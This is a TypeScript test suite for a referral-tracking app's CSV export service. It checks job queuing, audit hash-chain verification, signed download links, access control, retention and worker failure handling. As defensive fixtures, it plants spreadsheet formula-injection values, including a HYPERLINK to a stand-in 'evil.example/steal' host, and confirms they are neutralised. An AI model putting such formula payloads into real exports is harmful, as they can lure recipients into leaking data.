import { createHash } from 'node:crypto';
import { mkdtemp, readdir, readFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { parse } from 'csv-parse/sync';
import request from 'supertest';
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import type { AuditVerifyResponse, CaseDto, ExportJobDto, ExportType } from '../../../shared/types';
import { claimNextJob, expireOldExports, processPending, recoverStaleJobs } from '../../jobs/exportWorker';
import { computeAuditHash, GENESIS_HASH } from '../../lib/auditHash';
import { CSV_BOM } from '../../lib/csv';
import { LocalFileStore, setFileStore, type FileStore } from '../../storage/fileStore';
import { prisma } from '../../test/helpers';
import { act, advance, app, as, caseBody, createCase, makeWorkspace, type Workspace } from '../../test/workspace';
import { appendAuditBatch } from '../audit/append';
import { AUDIT_COLUMNS, CASE_COLUMNS } from './generators';
import { MAX_ACTIVE_EXPORTS } from './service';
import { signDownloadToken } from './signedUrl';

const H = 3_600_000;
let ws: Workspace;
let dir: string;
let store: LocalFileStore;

beforeAll(async () => {
  dir = await mkdtemp(path.join(tmpdir(), 'pathora-exports-'));
  store = new LocalFileStore(dir);
  setFileStore(store);
  ws = await makeWorkspace();
});
afterAll(async () => {
  setFileStore(undefined);
  await rm(dir, { recursive: true, force: true });
  await prisma.$disconnect();
});
afterEach(async () => {
  await processPending(); // leave no queued jobs behind for the next test
});

const request_ = (body: object, actor = ws.manager) => request(app).post('/api/exports').set(as(actor)).send(body);
const fetchJob = async (id: string, actor = ws.manager) => (await request(app).get(`/api/exports/${id}`).set(as(actor)).expect(200)).body as ExportJobDto;

/** Request an export, run the worker, and return the READY job. */
async function generate(type: ExportType, body: object = {}, w = ws): Promise<ExportJobDto> {
  const res = await request_({ type, ...body }, w.manager).expect(202);
  await processPending();
  const job = await fetchJob(res.body.id, w.manager);
  expect(job.status, JSON.stringify(job)).toBe('READY');
  return job;
}
const download = (job: ExportJobDto) => request(app).get(job.downloadUrl!).buffer(true).parse((res, cb) => {
  const chunks: Buffer[] = [];
  res.on('data', (c: Buffer) => chunks.push(c));
  res.on('end', () => cb(null, Buffer.concat(chunks)));
});
async function csvOf(job: ExportJobDto): Promise<{ raw: string; header: string[]; rows: string[][] }> {
  const raw = (await download(job).expect(200)).body.toString('utf8');
  expect(raw.startsWith(CSV_BOM)).toBe(true);
  const [header, ...rows] = parse(raw.slice(1), { relax_column_count: true }) as string[][];
  return { raw, header, rows };
}
const auditActions = async (orgId: string, resourceId: string) =>
  (await prisma.auditEvent.findMany({ where: { orgId, resourceId }, orderBy: { id: 'asc' } })).map((e) => e.action);

describe('requesting and generating', () => {
  it('queues a job (202), generates it in the worker, and audits request + generation', async () => {
    const res = await request_({ type: 'CASES_CSV' }).expect(202);
    expect(res.body).toMatchObject({ type: 'CASES_CSV', status: 'PENDING', requestedBy: 'Mona Manager', downloadUrl: null, rowCount: null });
    expect(res.body.fileName).toMatch(/^pathora-live-referrals-\d{8}-\d{4}\.csv$/);
    expect(await auditActions(ws.orgId, res.body.id)).toEqual(['EXPORT_REQUESTED']);

    expect(await processPending()).toBeGreaterThanOrEqual(1);
    const job = await fetchJob(res.body.id);
    expect(job.status).toBe('READY');
    expect(job.downloadUrl).toMatch(new RegExp(`^/api/exports/${job.id}/download\\?token=[\\w-]+\\.[\\w-]+$`));
    expect(Date.parse(job.expiresAt!) - Date.now()).toBeGreaterThan(6.9 * 24 * H);
    expect(await auditActions(ws.orgId, job.id)).toEqual(['EXPORT_REQUESTED', 'EXPORT_GENERATED']);
    const gen = await prisma.auditEvent.findFirstOrThrow({ where: { orgId: ws.orgId, resourceId: job.id, action: 'EXPORT_GENERATED' } });
    expect(gen).toMatchObject({ actorId: ws.manager.id, actorLabel: 'Mona Manager', actorRole: 'Programme Manager (export job)' });
  });

  it('records the file’s size and SHA-256 so a recipient can check it was not altered', async () => {
    const job = await generate('CASES_CSV');
    const bytes = (await download(job).expect(200)).body as Buffer;
    expect(job.byteSize).toBe(bytes.length);
    expect(job.sha256).toBe(createHash('sha256').update(bytes).digest('hex'));
  });

  it('serves the file with safe download headers and audits the download', async () => {
    const job = await generate('CASES_CSV');
    const res = await download(job).expect(200);
    expect(res.headers['content-type']).toBe('text/csv; charset=utf-8');
    expect(res.headers['content-disposition']).toBe(`attachment; filename="${job.fileName}"`);
    expect(res.headers['cache-control']).toBe('no-store');
    expect(res.headers['x-content-type-options']).toBe('nosniff');
    expect(Number(res.headers['content-length'])).toBe(job.byteSize);
    const ev = await prisma.auditEvent.findFirstOrThrow({ where: { orgId: ws.orgId, resourceId: job.id, action: 'EXPORT_DOWNLOADED' } });
    expect(ev).toMatchObject({ actorId: ws.manager.id, actorLabel: 'Mona Manager' });
    expect(ev.detail).toContain(job.fileName);
  });

  it('lists recent exports newest first, with names rather than ids', async () => {
    const a = await generate('CASES_CSV');
    const b = await generate('AUDIT_CSV');
    const list = (await request(app).get('/api/exports').set(as(ws.clinical)).expect(200)).body.exports as ExportJobDto[];
    const ids = list.map((j) => j.id);
    expect(ids.indexOf(b.id)).toBeLessThan(ids.indexOf(a.id));
    expect(list.find((j) => j.id === a.id)!.requestedBy).toBe('Mona Manager');
  });

  it('validates the request', async () => {
    for (const body of [{}, { type: 'NOPE' }, { type: 'CASES_CSV', from: 'yesterday' }, { type: 'CASES_CSV', from: '2026-12-01T00:00:00Z', to: '2026-01-01T00:00:00Z' }]) {
      expect((await request_(body)).status, JSON.stringify(body)).toBe(400);
    }
  });

  it('is idempotent with an Idempotency-Key (a double-click queues one export)', async () => {
    const send = () => request(app).post('/api/exports').set(as(ws.manager)).set('Idempotency-Key', 'export-key-0001').send({ type: 'AUDIT_CSV' });
    const [a, b] = [await send().expect(202), await send().expect(202)];
    expect(b.body.id).toBe(a.body.id);
    expect(b.headers['idempotent-replayed']).toBe('true');
  });

  it('caps the number of exports being prepared at once per organisation', async () => {
    const w = await makeWorkspace();
    for (let i = 0; i < MAX_ACTIVE_EXPORTS; i++) await request_({ type: 'AUDIT_CSV' }, w.manager).expect(202);
    const over = await request_({ type: 'AUDIT_CSV' }, w.manager);
    expect(over.status).toBe(429);
    expect(over.body.error.code).toBe('TOO_MANY_EXPORTS');
    await processPending();
    await request_({ type: 'AUDIT_CSV' }, w.manager).expect(202); // capacity is back once they finish
  });
});

describe('cases export content', () => {
  let w: Workspace;
  let normal: CaseDto, hostile: CaseDto, overdue: CaseDto, closed: CaseDto;
  beforeAll(async () => {
    w = await makeWorkspace();
    normal = await createCase(w, { patientName: 'Secret Patient', patientCode: 'PT-EXP1', sourceProgram: 'Mobile screening' });
    hostile = await createCase(w, { patientName: 'Another Person', sourceProgram: '=HYPERLINK("http://evil.example/steal","click")' });
    overdue = await createCase(w, { patientName: 'Late Person' });
    await prisma.referralCase.updateMany({ where: { orgId: w.orgId, refNumber: overdue.id }, data: { issuedAt: new Date(Date.now() - 80 * H), slaDueAt: new Date(Date.now() - 5 * H) } });
    closed = await createCase(w, { patientName: 'Done Person' });
    await advance(w, closed.id, 'attended');
    await act(w.focalA, closed.id, 'close', { closureReason: '@SUM(1)+cmd', outcomeSource: 'Dr. A, MD' }).expect(200);
    await prisma.referralCase.create({
      data: {
        refNumber: 'REF-9999-0001', orgId: w.orgId, isSynthetic: true, pathway: 'CANCER_SCREENING', sourceProgram: 'synthetic test run', stage: 'HANDOFF_SENT',
        patientId: (await prisma.referralCase.findFirstOrThrow({ where: { orgId: w.orgId } })).patientId,
        rulePackId: (await prisma.rulePack.findFirstOrThrow({ where: { orgId: w.orgId } })).id,
        coordinatorId: w.coordinator.id, facilityId: w.facilityA.id, issuedAt: new Date(), slaDueAt: new Date(Date.now() + H), dueDate: new Date(),
      },
    });
  });

  it('has the documented columns and one row per real referral (synthetic runs excluded)', async () => {
    const { header, rows } = await csvOf(await generate('CASES_CSV', {}, w));
    expect(header).toEqual([...CASE_COLUMNS]);
    expect(rows.map((r) => r[0]).sort()).toEqual([normal.id, hostile.id, overdue.id, closed.id].sort());
    expect(rows.every((r) => r.length === CASE_COLUMNS.length)).toBe(true);
  });

  it('never includes patient names — only the programme code', async () => {
    const { raw } = await csvOf(await generate('CASES_CSV', {}, w));
    for (const name of ['Secret', 'Another Person', 'Late Person', 'Done Person']) expect(raw).not.toContain(name);
    expect(raw).toContain('PT-EXP1');
  });

  it('neutralises spreadsheet formulas in free text, and still reads back as the original text', async () => {
    const { header, rows } = await csvOf(await generate('CASES_CSV', {}, w));
    const col = (n: string) => header.indexOf(n);
    const h = rows.find((r) => r[0] === hostile.id)!;
    expect(h[col('Source Program')]).toBe(`'=HYPERLINK("http://evil.example/steal","click")`);
    const c = rows.find((r) => r[0] === closed.id)!;
    expect(c[col('Closure Reason')]).toBe("'@SUM(1)+cmd");
    expect(c[col('Outcome Source')]).toBe('Dr. A, MD'); // commas are quoted, not mangled
    for (const r of rows) for (const cell of r) expect(/^[=+@\t\r]/.test(cell), `cell ${JSON.stringify(cell)}`).toBe(false);
  });

  it('matches the dashboard’s derived status and SLA, with negative hours left as a number', async () => {
    const { header, rows } = await csvOf(await generate('CASES_CSV', {}, w));
    const col = (n: string) => header.indexOf(n);
    const api = (await request(app).get('/api/cases?limit=200').set(as(w.manager)).expect(200)).body.cases as CaseDto[];
    const labels: Record<string, string> = { ACTIVE: 'Active', AWAITING_ACK: 'Awaiting Ack', OVERDUE_SLA: 'Overdue SLA', CLOSED_VERIFIED: 'Closed Verified' };
    for (const c of api) {
      const r = rows.find((x) => x[0] === c.id)!;
      expect(r[col('Status')], c.id).toBe(labels[c.status]);
      expect(Math.abs(Number(r[col('Hours To Deadline')]) - c.slaHoursRemaining) <= 1 || c.status === 'CLOSED_VERIFIED').toBe(true);
    }
    const late = rows.find((r) => r[0] === overdue.id)!;
    expect(late[col('Status')]).toBe('Overdue SLA');
    expect(late[col('Hours To Deadline')]).toMatch(/^-\d+$/); // "-5", not "'-5"
    expect(late[col('Stage')]).toBe('Handoff Sent');
  });

  it('closed cases show the full outcome trail and no open deadline; timestamps are ISO-8601 UTC', async () => {
    const { header, rows } = await csvOf(await generate('CASES_CSV', {}, w));
    const col = (n: string) => header.indexOf(n);
    const c = rows.find((r) => r[0] === closed.id)!;
    expect(c[col('Stage')]).toBe('Closed');
    expect(c[col('Next SLA Deadline')]).toBe('');
    expect(c[col('Hours To Deadline')]).toBe('');
    for (const f of ['Referral Issued', 'Facility Ack', 'Patient Attended', 'Evaluation Completed', 'Outcome Documented']) {
      expect(c[col(f)], f).toMatch(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/);
    }
    const open = rows.find((r) => r[0] === normal.id)!;
    expect(open[col('Facility Ack')]).toBe('');
    expect(open[col('Red Flag')]).toBe('false');
  });

  it('honours a date range on referral issue time', async () => {
    const future = await csvOf(await generate('CASES_CSV', { from: new Date(Date.now() + 365 * 24 * H).toISOString() }, w));
    expect(future.rows).toEqual([]);
    const past = await csvOf(await generate('CASES_CSV', { to: new Date(Date.now() - 365 * 24 * H).toISOString() }, w));
    expect(past.rows).toEqual([]);
    const inside = await csvOf(await generate('CASES_CSV', { from: new Date(Date.now() - 100 * H).toISOString(), to: new Date(Date.now() + H).toISOString() }, w));
    expect(inside.rows.length).toBeGreaterThanOrEqual(3);
  });

  it('exports every row when the data spans several internal batches', async () => {
    const big = await makeWorkspace();
    const rowFor = (i: number) => `BULK-${i},c,Cancer Screening,Src,Cora Coordinator,${big.facilityA.name}`;
    for (const start of [0, 260]) {
      const csv = Array.from({ length: 260 }, (_, i) => rowFor(start + i)).join('\n');
      await request(app).post('/api/cases/import').set(as(big.coordinator)).send({ csv, consentAttested: true }).expect(201);
    }
    const job = await generate('CASES_CSV', {}, big);
    expect(job.rowCount).toBe(520);
    const { rows } = await csvOf(job);
    expect(rows).toHaveLength(520);
    expect(new Set(rows.map((r) => r[0])).size).toBe(520);
  }, 60_000);
});

describe('audit export is independently verifiable', () => {
  it('lets a recipient recompute the whole hash chain from the file alone', async () => {
    const w = await makeWorkspace();
    const c = await createCase(w);
    await act(w.focalA, c.id, 'acknowledge').expect(200);
    // Enough events to cross the generator's internal batch size.
    const at = new Date();
    await prisma.$transaction((tx) =>
      appendAuditBatch(tx, Array.from({ length: 1100 }, (_, n) => ({ orgId: w.orgId, at, actorId: null, actorLabel: 'Bulk', actorRole: 'Test', action: 'BULK', resourceType: 'T', resourceId: `R${n}`, detail: `event ${n}` }))),
    );

    const job = await generate('AUDIT_CSV', {}, w);
    const { header, rows } = await csvOf(job);
    expect(header).toEqual([...AUDIT_COLUMNS]);
    expect(rows.length).toBe(job.rowCount);
    expect(rows.length).toBeGreaterThan(1100);

    const col = (n: string) => header.indexOf(n);
    let prev = GENESIS_HASH;
    for (const r of rows) {
      expect(r[col('Previous Hash')]).toBe(prev);
      const recomputed = computeAuditHash(prev, {
        orgId: r[col('Organisation ID')], at: new Date(r[col('Timestamp')]), actorId: r[col('Actor ID')] || null,
        actorLabel: r[col('Actor')], actorRole: r[col('Role')], action: r[col('Action')],
        resourceType: r[col('Resource Type')], resourceId: r[col('Resource ID')], detail: r[col('Detail')],
      });
      expect(r[col('Hash')]).toBe(recomputed);
      prev = r[col('Hash')];
    }
    expect(job.chainTip).toBe(prev); // the manifest says exactly where the file ends
  }, 60_000);

  it('is a consistent snapshot: it includes its own request but not its own completion', async () => {
    const w = await makeWorkspace();
    const job = await generate('AUDIT_CSV', {}, w);
    const { header, rows } = await csvOf(job);
    const actions = rows.map((r) => r[header.indexOf('Action')]);
    expect(actions).toContain('EXPORT_REQUESTED');
    expect(actions).not.toContain('EXPORT_GENERATED');
  });

  it('its chain tip is a real event in the live chain, which still verifies', async () => {
    const w = await makeWorkspace();
    const job = await generate('AUDIT_CSV', {}, w);
    const ev = await prisma.auditEvent.findFirst({ where: { orgId: w.orgId, hash: job.chainTip! } });
    expect(ev).not.toBeNull();
    const verify = (await request(app).get('/api/audit/verify').set(as(w.manager)).expect(200)).body as AuditVerifyResponse;
    expect(verify.ok).toBe(true);
  });

  it('honours a time range', async () => {
    const w = await makeWorkspace();
    await createCase(w);
    const none = await generate('AUDIT_CSV', { from: new Date(Date.now() + 365 * 24 * H).toISOString() }, w);
    expect(none.rowCount).toBe(0);
    expect(none.chainTip).toBeNull();
    expect((await csvOf(none)).rows).toEqual([]);
  });
});

describe('who can export and download', () => {
  it('manager, clinical lead and DPO can; coordinator and facility focal cannot', async () => {
    for (const a of [ws.manager, ws.clinical, ws.dpo]) expect((await request_({ type: 'AUDIT_CSV' }, a)).status, a.name).toBe(202);
    await processPending();
    for (const a of [ws.coordinator, ws.focalA]) {
      expect((await request_({ type: 'AUDIT_CSV' }, a)).status, a.name).toBe(403);
      expect((await request(app).get('/api/exports').set(as(a))).status).toBe(403);
    }
    expect((await request(app).post('/api/exports').send({ type: 'AUDIT_CSV' })).status).toBe(401);
    expect((await request(app).get('/api/exports')).status).toBe(401);
  });

  it('exports are private to the organisation', async () => {
    const other = await makeWorkspace();
    const mine = await generate('CASES_CSV');
    expect((await request(app).get(`/api/exports/${mine.id}`).set(as(other.manager))).status).toBe(404);
    const theirs = (await request(app).get('/api/exports').set(as(other.manager)).expect(200)).body.exports as ExportJobDto[];
    expect(theirs.some((j) => j.id === mine.id)).toBe(false);
    expect((await request(app).get('/api/exports/not-a-real-id').set(as(ws.manager))).status).toBe(404);
  });
});

describe('download links', () => {
  const link = (jobId: string, token: string) => request(app).get(`/api/exports/${jobId}/download?token=${encodeURIComponent(token)}`);

  it('rejects missing, forged, expired and wrong-export tokens without revealing anything', async () => {
    const job = await generate('CASES_CSV');
    const other = await generate('AUDIT_CSV');
    const good = job.downloadUrl!.split('token=')[1];
    const stale = signDownloadToken(job.id, ws.orgId, Date.now() - 10 * 60_000);
    const otherOrgToken = signDownloadToken(job.id, 'some-other-org');
    const cases: Array<[string, string]> = [
      ['no token', ''], ['garbage', 'garbage'], ['tampered', good.slice(0, -3) + 'AAA'], ['expired', stale],
      ['token for another export', other.downloadUrl!.split('token=')[1]],
    ];
    for (const [name, token] of cases) {
      const res = await link(job.id, token);
      expect(res.status, name).toBe(403);
      expect(res.body.error.code).toBe('INVALID_LINK');
    }
    // right signature, wrong organisation: the job is simply not found in that org
    expect((await link(job.id, otherOrgToken)).status).toBe(410);
    expect((await request(app).get(`/api/exports/${job.id}/download`)).status).toBe(403);
    expect((await request(app).get('/api/exports/short/download?token=x')).status).toBe(403);
    expect(await auditActions(ws.orgId, job.id)).not.toContain('EXPORT_DOWNLOADED'); // none of those were downloads
  });

  it('stops working if the requester is deactivated or loses the permission', async () => {
    const w = await makeWorkspace();
    const job = await generate('CASES_CSV', {}, w);
    await download(job).expect(200);
    await prisma.user.update({ where: { id: w.manager.id }, data: { role: 'PROGRAMME_COORDINATOR' } });
    expect((await download(job)).status).toBe(403);
    await prisma.user.update({ where: { id: w.manager.id }, data: { role: 'PROGRAMME_MANAGER', active: false } });
    expect((await download(job)).status).toBe(403);
  });

  it('returns 410 once the export has expired or its file is gone', async () => {
    const a = await generate('CASES_CSV');
    await prisma.exportJob.update({ where: { id: a.id }, data: { expiresAt: new Date(Date.now() - 1000) } });
    expect((await download(a)).status).toBe(410);

    const b = await generate('CASES_CSV');
    await store.remove(`${ws.orgId}/${b.id}.csv`);
    expect((await download(b)).status).toBe(410);
  });

  it('never exposes a download link for an export that is not ready', async () => {
    const w = await makeWorkspace();
    const pending = (await request_({ type: 'CASES_CSV' }, w.manager).expect(202)).body as ExportJobDto;
    expect(pending.downloadUrl).toBeNull();
    expect((await fetchJob(pending.id, w.manager)).downloadUrl).toBeNull();
  });
});

describe('retention', () => {
  it('deletes expired files, marks the job EXPIRED, and withdraws the link', async () => {
    const job = await generate('CASES_CSV');
    const file = path.join(dir, ws.orgId, `${job.id}.csv`);
    expect(await readdir(path.join(dir, ws.orgId))).toContain(`${job.id}.csv`);

    await prisma.exportJob.update({ where: { id: job.id }, data: { expiresAt: new Date(Date.now() - 1000) } });
    expect(await expireOldExports()).toBeGreaterThanOrEqual(1);
    expect(await readdir(path.join(dir, ws.orgId))).not.toContain(`${job.id}.csv`);
    await expect(readFile(file)).rejects.toThrow();

    const after = await fetchJob(job.id);
    expect(after.status).toBe('EXPIRED');
    expect(after.downloadUrl).toBeNull();
  });

  it('leaves exports that have not expired alone', async () => {
    const job = await generate('CASES_CSV');
    await expireOldExports();
    expect((await fetchJob(job.id)).status).toBe('READY');
    await download(job).expect(200);
  });
});

describe('the worker', () => {
  it('generates each job exactly once even when several workers race', async () => {
    const [a, b] = [await makeWorkspace(), await makeWorkspace()];
    const ids: string[] = [];
    for (const w of [a, b]) for (let i = 0; i < MAX_ACTIVE_EXPORTS; i++) ids.push((await request_({ type: 'AUDIT_CSV' }, w.manager).expect(202)).body.id);

    const processed = await Promise.all([processPending(), processPending(), processPending(), processPending()]);
    expect(processed.reduce((n, x) => n + x, 0)).toBe(ids.length);
    for (const id of ids) {
      const w = (await prisma.exportJob.findUniqueOrThrow({ where: { id } }));
      expect(w.status).toBe('READY');
      expect(w.attempts).toBe(1);
      expect((await prisma.auditEvent.findMany({ where: { resourceId: id, action: 'EXPORT_GENERATED' } })).length).toBe(1);
    }
  });

  it('claims the oldest job first and counts the attempt', async () => {
    const w = await makeWorkspace();
    const first = (await request_({ type: 'AUDIT_CSV' }, w.manager).expect(202)).body.id as string;
    const second = (await request_({ type: 'AUDIT_CSV' }, w.manager).expect(202)).body.id as string;
    // earlier tests' leftovers are drained, so the oldest pending job is ours
    await processPending();
    const w2 = await makeWorkspace();
    const a = (await request_({ type: 'AUDIT_CSV' }, w2.manager).expect(202)).body.id as string;
    const b = (await request_({ type: 'AUDIT_CSV' }, w2.manager).expect(202)).body.id as string;
    expect(await claimNextJob()).toBe(a);
    expect(await claimNextJob()).toBe(b);
    expect(await claimNextJob()).toBeNull();
    expect((await prisma.exportJob.findUniqueOrThrow({ where: { id: a } })).attempts).toBe(1);
    void first; void second;
    // put them back through the normal path so nothing is left RUNNING
    await prisma.exportJob.updateMany({ where: { id: { in: [a, b] } }, data: { status: 'PENDING' } });
  });

  it('re-queues jobs a crashed worker left RUNNING, and gives up after the maximum attempts', async () => {
    const w = await makeWorkspace();
    const mk = (over: object) => prisma.exportJob.create({ data: { orgId: w.orgId, type: 'AUDIT_CSV', requestedBy: w.manager.id, fileName: 'x.csv', status: 'RUNNING', ...over } });
    const stale = await mk({ attempts: 1, startedAt: new Date(Date.now() - 20 * 60_000) });
    const exhausted = await mk({ attempts: 3, startedAt: new Date(Date.now() - 20 * 60_000) });
    const fresh = await mk({ attempts: 1, startedAt: new Date() });

    expect(await recoverStaleJobs()).toBeGreaterThanOrEqual(2);
    expect((await prisma.exportJob.findUniqueOrThrow({ where: { id: stale.id } })).status).toBe('PENDING');
    const gone = await prisma.exportJob.findUniqueOrThrow({ where: { id: exhausted.id } });
    expect(gone).toMatchObject({ status: 'FAILED', error: 'Generation was interrupted. Please try again.' });
    expect((await prisma.exportJob.findUniqueOrThrow({ where: { id: fresh.id } })).status).toBe('RUNNING'); // a live job is left alone

    await processPending();
    expect((await prisma.exportJob.findUniqueOrThrow({ where: { id: stale.id } })).status).toBe('READY');
    await prisma.exportJob.update({ where: { id: fresh.id }, data: { status: 'FAILED' } });
  });

  describe('when generation fails', () => {
    const failingStore = (failOn: number): FileStore => ({
      open: async (key) => {
        const real = await store.open(key);
        let writes = 0;
        return { ...real, write: async (c) => { if (++writes >= failOn) throw new Error(`disk full at ${dir}/secret/path`); return real.write(c); } };
      },
      read: (k) => store.read(k), size: (k) => store.size(k), remove: (k) => store.remove(k),
    });
    afterEach(() => setFileStore(store));

    it('marks the job FAILED with a safe message, audits it, and leaves no partial file', async () => {
      const w = await makeWorkspace();
      await createCase(w);
      setFileStore(failingStore(3)); // BOM + header succeed, then a row write fails
      const id = (await request_({ type: 'CASES_CSV' }, w.manager).expect(202)).body.id as string;
      await processPending();

      const job = await fetchJob(id, w.manager);
      expect(job).toMatchObject({ status: 'FAILED', downloadUrl: null, error: 'The export could not be generated. Please try again.' });
      expect(JSON.stringify(job)).not.toMatch(/disk full|secret\/path/); // internals stay in the server log
      expect(await auditActions(w.orgId, id)).toEqual(['EXPORT_REQUESTED', 'EXPORT_FAILED']);
      const files = await readdir(path.join(dir, w.orgId)).catch(() => [] as string[]);
      expect(files.filter((f) => f.startsWith(id))).toEqual([]);
    });

    it('a failed export does not block the next one', async () => {
      const w = await makeWorkspace();
      setFileStore(failingStore(1));
      const bad = (await request_({ type: 'AUDIT_CSV' }, w.manager).expect(202)).body.id as string;
      await processPending();
      expect((await fetchJob(bad, w.manager)).status).toBe('FAILED');
      setFileStore(store);
      expect((await generate('AUDIT_CSV', {}, w)).status).toBe('READY');
    });
  });
});

void caseBody;
